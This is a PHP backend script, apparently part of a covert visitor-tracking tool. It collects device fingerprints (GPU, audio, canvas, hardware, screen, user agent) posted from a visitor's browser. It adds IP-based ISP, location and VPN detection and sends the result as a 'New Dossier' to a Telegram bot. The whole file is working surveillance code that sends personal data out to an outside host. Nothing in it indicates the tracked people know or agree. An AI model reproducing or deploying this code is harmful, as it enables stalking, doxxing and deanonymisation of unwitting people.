<?php
require_once 'config.php';
require_once 'telegram.php';

$json = file_get_contents('php://input');
$d = json_decode($json, true);

if ($d) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    $ip = explode(',', $ip)[0];

    // استخبارات الأي بي (Timeout 1.5s لتجنب التعليق)
    $ctx = stream_context_create(['http' => ['timeout' => 1.5]]);
    $api = @json_decode(file_get_contents("http://ip-api.com/json/{$ip}?fields=status,country,city,isp,as,hosting", false, $ctx), true);
    
    $isp = $api['isp'] ?? 'Unknown';
    $loc = ($api['city'] ?? '') . ", " . ($api['country'] ?? '');
    $vpn = ($api['hosting'] ?? false) ? "نعم (VPN/Proxy) 🔴" : "لا (حقيقي) 🟢";

    // تخمين الموديل لو مختفي
    $model = $d['model'] ?? 'Hidden';
    if($model == 'Hidden' && strpos($d['gpu'], 'Adreno (TM) 740') !== false) $model = "S23/S24 Ultra (Detected)";

    $msg = "🚀 <b>System-X: New Dossier</b>\n";
    $msg .= "━━━━━━━━━━━━━━\n";
    $msg .= "🌍 <b>الشبكة والموقع:</b>\n";
    $msg .= "• الـ IP: <code>$ip</code>\n";
    $msg .= "• الشركة: <code>$isp</code>\n";
    $msg .= "• الموقع: <code>$loc</code>\n";
    $msg .= "• VPN: <b>$vpn</b>\n\n";

    $msg .= "📱 <b>الجهاز:</b>\n";
    $msg .= "• الموديل: <code>$model</code>\n";
    $msg .= "• النظام: <code>" . ($d['osv'] ?? 'N/A') . "</code>\n";
    $msg .= "• المعالج: <code>{$d['hw']['cores']} Cores</code>\n";
    $msg .= "• الرام: <code>{$d['hw']['ram']} GB</code> | الهارد: <code>" . ($d['disk'] ?? '0') . " GB</code>\n\n";

    $msg .= "🖥️ <b>الشاشة والرسوميات:</b>\n";
    $msg .= "• الأبعاد: <code>" . ($d['screen']['w'] * $d['screen']['dpr']) . "x" . ($d['screen']['h'] * $d['screen']['dpr']) . "</code>\n";
    $msg .= "• الـ GPU: <code>{$d['gpu']}</code>\n\n";

    $msg .= "🔍 <b>بصمات عميقة:</b>\n";
    $msg .= "• بصمة الصوت: <code>{$d['audio']}</code>\n";
    $msg .= "• بصمة الحسابات: <code>{$d['math']}</code>\n";
    $msg .= "• الكانفاس: <code>{$d['canvas']}</code>\n\n";

    $msg .= "🌐 <b>المتصفح:</b>\n";
    $msg .= "<code>{$d['ua']}</code>\n";
    $msg .= "━━━━━━━━━━━━━━\n";
    $msg .= "👨‍💻 <b>Dev: @" . DEV_USERNAME . "</b>";

    sendTelegramMessage($msg);
}
?>
